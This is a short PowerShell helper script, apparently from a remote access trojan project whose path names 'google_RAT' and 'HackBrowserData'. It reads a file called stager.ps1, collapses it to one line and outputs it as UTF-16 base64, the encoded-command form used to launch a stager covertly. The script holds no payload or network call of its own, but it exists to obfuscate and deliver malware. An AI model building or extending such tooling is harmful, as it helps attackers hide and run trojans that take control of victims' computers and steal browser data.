# read in UTF8 encoded file data
$utf8 = [system.io.file]::readallbytes('C:\Users\ADMIN\Desktop\Desktop Folders\HackBrowserData\google_RAT\client\PowerShell\stager.ps1');
$text = [system.text.encoding]::utf8.getstring($utf8);
# compress stager into one line
$text = $text.replace("`n","").replace("`r","");
# convert from UTF8 to Unicode (PowerShell.exe needs base64 Unicode)
$unicode = [system.text.encoding]::convert(
    [system.text.encoding]::utf8,
    [system.text.encoding]::unicode,
    [system.text.encoding]::utf8.getbytes($text));
# output base64 stager
[system.convert]::tobase64string($unicode);
